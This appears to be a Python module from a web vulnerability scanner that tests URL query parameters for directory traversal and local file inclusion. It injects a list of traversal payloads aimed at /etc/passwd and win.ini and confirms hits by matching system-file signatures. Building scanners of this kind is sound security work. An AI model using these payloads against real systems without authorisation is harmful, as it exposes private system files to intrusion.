"""
Directory Traversal & Local File Inclusion (LFI) Detection Module
"""
import asyncio
import logging
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..core.http_client import AsyncHTTPClient

logger = logging.getLogger(__name__)

TRAVERSAL_PARAMS = ["file", "page", "path", "doc", "document", "template", "include", "view", "load", "read", "filename"]

TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

SIGNATURES = [
    re.compile(r"root:.*:0:0:", re.IGNORECASE),
    re.compile(r"\[extensions\]", re.IGNORECASE),
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"\[boot loader\]", re.IGNORECASE),
    re.compile(r"bin:x:\d+:\d+:", re.IGNORECASE)
]


class PathTraversalDetector:
    """
    Detects Directory Path Traversal and Local File Inclusion (LFI)
    """

    def __init__(self, http_client: AsyncHTTPClient):
        self.http_client = http_client
        self.findings = []

    async def scan(
        self,
        urls: List[str],
        intensity: str = "medium",
        authentication: Optional[Dict] = None
    ) -> List[Dict[str, Any]]:
        self.findings = []
        if not urls:
            return []

        tasks = []
        for url in urls[:15]:
            tasks.append(self._test_url(url))

        await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings

    async def _test_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param in params.keys():
            if param.lower() in TRAVERSAL_PARAMS or any(k in param.lower() for k in ["file", "path"]):
                for payload in TRAVERSAL_PAYLOADS:
                    modified = dict(params)
                    modified[param] = [payload]
                    new_query = urlencode(modified, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

                    try:
                        resp = await self.http_client.get(test_url)
                        if resp and resp.status == 200:
                            text = await resp.text()
                            for sig in SIGNATURES:
                                if sig.search(text):
                                    self.findings.append({
                                        "type": "path_traversal",
                                        "severity": "CRITICAL",
                                        "title": "Directory Path Traversal / LFI Confirmed",
                                        "url": test_url,
                                        "parameter": param,
                                        "evidence": f"Payload: {payload} matched system signature: {sig.pattern}",
                                        "description": f"The application allows arbitrary local file retrieval via the parameter '{param}'.",
                                        "remediation": "Do not pass user-supplied input directly to filesystem APIs. Use path normalization with os.path.basename and validate against an allowlist.",
                                        "cvss_score": 9.3
                                    })
                                    return
                    except Exception:
                        pass
